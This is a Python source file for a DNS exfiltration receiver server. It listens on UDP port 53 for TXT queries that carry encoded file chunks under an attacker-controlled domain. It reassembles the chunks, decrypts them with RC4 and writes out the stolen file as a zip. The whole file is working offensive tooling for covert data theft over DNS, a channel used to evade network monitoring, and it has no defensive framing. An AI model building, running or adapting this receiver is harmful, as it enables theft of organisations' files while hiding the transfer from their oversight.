#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS Exfiltration Receiver Server - Python 3
Listens for DNS TXT queries and reconstructs exfiltrated files.
Must be run as root/administrator to bind to port 53.

Usage:
    sudo python3 server.py -d <domain> -p <password> [--port <port>]
"""

import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import sys

#======================================================================================================
#                                                                           HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# Class providing RC4 encryption/decryption functions
#------------------------------------------------------------------------
class RC4:
    def __init__(self, key=None):
        # Use list for mutable sequence in Python 3
        self.state = list(range(256))
        self.x = self.y = 0

        if key is not None:
            # Accept str or bytes; convert str to bytes
            if isinstance(key, str):
                key = key.encode('utf-8')
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        j = 0
        key_len = len(key)
        for i in range(256):
            j = (j + key[i % key_len] + self.state[i]) & 0xFF
            self.state[i], self.state[j] = self.state[j], self.state[i]
        self.x = 0
        self.y = 0

    # Decrypt binary input data (data should be bytes/bytearray)
    def binaryDecrypt(self, data):
        output = bytearray(len(data))
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            k = self.state[(self.state[self.x] + self.state[self.y]) & 0xFF]
            output[i] = data[i] ^ k
        return bytes(output)


#------------------------------------------------------------------------
def progress(count, total, status=''):
    """
    Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
    """
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total))) if total else 0

    percents = round(100.0 * count / float(total), 1) if total else 0.0
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))
    sys.stdout.flush()


#------------------------------------------------------------------------
def fromBase64URL(msg):
    """Decode base64url encoded string"""
    msg = msg.replace('_', '/').replace('-', '+')
    padding = len(msg) % 4
    if padding == 3:
        return b64decode(msg + '=')
    elif padding == 2:
        return b64decode(msg + '==')
    else:
        return b64decode(msg)


#------------------------------------------------------------------------
def fromBase32(msg):
    """Decode base32 encoded string"""
    # Base32 decoding, we need to add the padding back
    mod = len(msg) % 8
    if mod == 2:
        padding = "======"
    elif mod == 4:
        padding = "===="
    elif mod == 5:
        padding = "==="
    elif mod == 7:
        padding = "="
    else:
        padding = ""

    return b32decode(msg.upper() + padding)


#------------------------------------------------------------------------
def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    if not isinstance(string, str):
        string = str(string)

    attr = []
    # bold
    attr.append('1')

    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
        s = string.strip()
        if s.startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif s.startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif s.startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif s.startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string


#======================================================================================================
#                                                                           MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

    #------------------------------------------------------------------------
    # Parse arguments
    parser = argparse.ArgumentParser(description='DNS Exfiltration Receiver Server')
    parser.add_argument("-d", "--domain", 
                       help="The domain name used to exfiltrate data", 
                       dest="domainName", 
                       required=True)
    parser.add_argument("-p", "--password", 
                       help="The password used to encrypt/decrypt exfiltrated data", 
                       dest="password", 
                       required=True)
    parser.add_argument("--port", 
                       help="UDP port to listen on (default: 53)", 
                       dest="port", 
                       type=int,
                       default=53)
    args = parser.parse_args()

    # Setup a UDP server listening on specified port
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        udps.bind(('', args.port))
        print(color(f"[*] DNS server listening on port {args.port}"))
        print(color(f"[*] Waiting for data from domain: {args.domainName}"))
        print(color("[*] Press Ctrl+C to stop"))
    except PermissionError:
        print(color(f"[!] Permission denied. Need root/administrator privileges to bind to port {args.port}"))
        sys.exit(1)
    except OSError as e:
        print(color(f"[!] Cannot bind to port {args.port}: {e}"))
        sys.exit(1)

    try:
        useBase32 = False
        chunkIndex = 0
        fileData = ''
        nbChunks = 0
        fileName = None

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            # Only handle TXT queries (QTYPE 16)
            if request.q.qtype == QTYPE.TXT or request.q.qtype == 16:
                # Get the query qname
                qname = str(request.q.qname)

                #-----------------------------------------------------------------------------
                # Check if it is the initialization request
                if qname.upper().startswith("INIT."):
                    msgParts = qname.split(".")

                    # msgParts[1] contains the encoded payload (filename|nbChunks)
                    try:
                        msg = fromBase32(msgParts[1])
                        # msg is bytes; decode to str for splitting
                        msg_text = msg.decode('utf-8')

                        fileName = msg_text.split('|')[0]        # Name of the file being exfiltrated
                        nbChunks = int(msg_text.split('|')[1])   # Total number of chunks expected

                        if len(msgParts) > 2 and msgParts[2].upper() == "BASE32":
                            useBase32 = True
                            print(color("[+] Data was encoded using Base32"))
                        else:
                            useBase32 = False
                            print(color("[+] Data was encoded using Base64URL"))

                        # Reset all variables
                        fileData = ''
                        chunkIndex = 0

                        print(color(f"[+] Receiving file [{fileName}] as a ZIP file in [{nbChunks}] chunks"))

                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                        udps.sendto(reply.pack(), addr)
                    except Exception as e:
                        print(color(f"[!] Error parsing init request: {e}"))

                #-----------------------------------------------------------------------------
                # Else, start receiving the file, chunk by chunk
                else:
                    try:
                        # Remove the top level domain name from the qname
                        msg = qname[0:-(len(args.domainName) + 2)]
                        chunkNumber, rawData = msg.split('.', 1)

                        #---- Is this the chunk of data we're expecting?
                        if int(chunkNumber) == chunkIndex:
                            fileData += rawData.replace('.', '')
                            chunkIndex += 1
                            if nbChunks > 0:
                                progress(chunkIndex, nbChunks, "Receiving file")

                        #---- Always acknowledge the received chunk
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
                        udps.sendto(reply.pack(), addr)

                        #---- Have we received all chunks of data?
                        if nbChunks > 0 and chunkIndex == nbChunks:
                            print()  # New line after progress bar
                            try:
                                # Create and initialize the RC4 decryptor object
                                rc4Decryptor = RC4(args.password)

                                # Save data to a file
                                outputFileName = fileName + ".zip"
                                print(color(f"[+] Decrypting using password [{args.password}] and saving to output file [{outputFileName}]"))
                                
                                with open(outputFileName, 'wb+') as fileHandle:
                                    if useBase32:
                                        decoded = fromBase32(fileData)
                                    else:
                                        decoded = fromBase64URL(fileData)
                                    
                                    fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decoded)))
                                
                                print(color(f"[+] Output file [{outputFileName}] saved successfully"))
                                print(color("[*] Ready for next file transfer"))
                                
                                # Reset for next transfer
                                fileData = ''
                                chunkIndex = 0
                                nbChunks = 0
                                fileName = None
                                
                            except IOError as e:
                                print(color(f"[!] Could not write file [{outputFileName}]: {e}"))
                            except Exception as e:
                                print(color(f"[!] Error while decrypting/saving file: {e}"))
                    except ValueError as e:
                        # Malformed chunk data, ignore
                        pass
                    except Exception as e:
                        print(color(f"[!] Error processing chunk: {e}"))

            # Query type is not TXT
            else:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)
                
    except KeyboardInterrupt:
        print()
        print(color("[!] Interrupted by user"))
    except Exception as e:
        print(color(f"[!] Error: {e}"))
    finally:
        print(color("[!] Stopping DNS Server"))
        udps.close()
